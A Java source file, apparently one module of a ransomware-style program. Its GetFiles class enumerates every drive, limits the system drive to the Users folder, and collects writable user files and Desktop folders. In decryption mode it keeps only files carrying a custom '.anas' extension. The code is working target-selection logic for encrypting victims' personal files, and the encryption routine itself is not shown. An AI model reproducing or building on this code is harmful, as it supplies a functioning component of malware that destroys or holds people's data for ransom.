package files;

import enums.To;
import helpers.Constants;

import java.io.File;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Objects;

public class GetFiles {
    private final File[] drivers;
    private final ArrayList<File> desktops;
    private final String os;

    public GetFiles(String os) {
        drivers = scanDrivers();
        desktops = new ArrayList<>();
        this.os = os;
    }

    private File[] scanDrivers() { // Get partitions
        return File.listRoots();
    }

    public File[] getDrivers() {
        return drivers;
    }

    public ArrayList<File> scanFiles(File drive, To to) {
        ArrayList<File> files = new ArrayList<>(Arrays.asList(Objects.requireNonNull(drive.listFiles())));

        int i = 0;
        boolean isEnd;
        boolean isSystemDrive = (drive.toString().equals("C:\\"));
        if (isSystemDrive) {
            // delete files system
            for (int n = 0; n < files.size(); n++)
                if (!files.get(n).getName().equals("Users"))
                    files.remove(n--);
        }
        loo:
        do {
            File file = files.get(i);
            while (file.isDirectory()) {
                if (file.getName().equals("Desktop") && file.canWrite())
                    desktops.add(file);
                    
                if (file.canWrite() && !file.isHidden() && file.listFiles() != null) {
                    files.remove(i);
                    files.addAll(i, Arrays.asList(file.listFiles()));
                    file = files.get(i);
                } else {
                    files.remove(i);
                    if (i < files.size())
                        file = files.get(i);
                    else
                        break loo;
                }
            }
            isEnd = files.size() <= ++i;
        } while (!isEnd);

        // Filtration
        for (int j = 0; j < files.size(); j++) {
            File file = files.get(j);
            if (to == To.DECRYPTION && !file.getName().endsWith(".anas")) {
                files.remove(j--);
                continue;
            }
            // Delete directories and can't write files and operation file
            if (file.isDirectory() || !file.canWrite() || file.getName().equals(Constants.operationFileName))
                files.remove(j--);
        }
        return files;
    }

    public ArrayList<File> getDesktops() {
        return desktops;
    }
}
